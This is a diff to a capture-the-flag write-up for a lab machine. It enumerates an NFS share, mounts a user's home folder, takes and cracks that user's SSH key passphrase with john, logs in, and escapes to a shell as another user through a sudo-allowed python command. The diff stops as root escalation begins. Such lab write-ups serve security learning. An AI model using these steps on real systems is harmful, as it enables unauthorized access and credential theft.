@@ -8,9 +8,7 @@ categories:
 
 ## Enumeration
 
-### nmap:
-
-```
+```bash
 PORT STATE SERVICE REASON VERSION
 21/tcp open ftp syn-ack vsftpd 3.0.3
 
@@ -68,9 +66,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 There is a website running, a pet shop, and a nfs server.
 
-There is not much information on the website and ftp doesn't allow anonymous login, we can try to enumerate the nfs server.
+There is not much information on the website and ftp doesn't allow anonymous login,
+we can try to enumerate the nfs server.
 
-```
+```bash
 $showmount -e 172.31.1.7
 
 Export list for 172.31.1.7:
@@ -79,9 +78,9 @@ Export list for 172.31.1.7:
 
 ## Exploitation
 
-Now we know there is a user called amir, and we can try to mount the amir folder on our machine
+Now we know there is a user called "amir", and we can try to mount the amir folder on our machine
 
-```
+```bash
 mount -t nfs 172.31.1.7:home/amir /mnt/TempNFS
 
 drwxrwxr-x 5 nair0lf32 docker 4096  2 avril  2020 .
@@ -97,14 +96,14 @@ drwxrwxr-x 2 nair0lf32 docker 4096  2 avril  2020 .ssh
 -rw-r--r-- 1 nair0lf32 docker 7713  2 avril  2020 .viminfo
 ```
 
-We have access to the .ssh folder with amir's private id_rsa key. We crack that:  
-First we use: 
+We have access to the .ssh folder with amir's private id_rsa key. We crack that:
+First we use:
 
-`python2 /usr/share/john/ssh2john.py id_rsa > id_rsa.john` 
+`python2 /usr/share/john/ssh2john.py id_rsa > id_rsa.john`
 
 to get a john formatted hash file, then we run john on the hash file:
 
-```
+```bash
 john -w=/usr/share/wordlists/rockyou.txt id_rsa.john
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
@@ -117,16 +116,13 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 hello6           (id_rsa)
 1g 0:00:00:08 DONE (2021-10-27 11:52) 0.1213g/s 1740Kp/s 1740Kc/s 1740KC/sa6_123..*7¡Vamos!
 Session completed
-
-
-ssh creds:
-amir:hello6
-
 ```
+
+ssh creds: `amir:hello6`
 
 Now we can ssh as amir using his key...note that ssh is not on port 22
 
-```
+```bash
 ssh amir@172.31.1.7 -i id_rsa -p 27853
 
 amir@shares:/home$ ls
@@ -137,7 +133,7 @@ There seem to be another user called amy and as amir's folder is empty I guess o
 
 We check sudo rights for possible lateral movement:
 
-```
+```bash
 $ sudo -l
 Matching Defaults entries for amir on shares:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -149,20 +145,21 @@ User amir may run the following commands on shares:
 ```
 
 And we can. we can run either python or pkexec as amy.
+
 I chose python because I already know how to work with that one. Gotta explore pkexec too later.
 
-```
+```bash
 sudo -u amy /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
 ```
 
-And now we are amy. We get User Flag in amy's home folder:  
+And now we are amy. We get User Flag in amy's home folder:
 `cat access.txt`
 
 Now its Privilege Escalation time:
 
 ## Privilege Escalation
 
-```
+```bash
 amy@shares:/home/amy$ sudo -l
 Matching Defaults entries for amy on shares:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
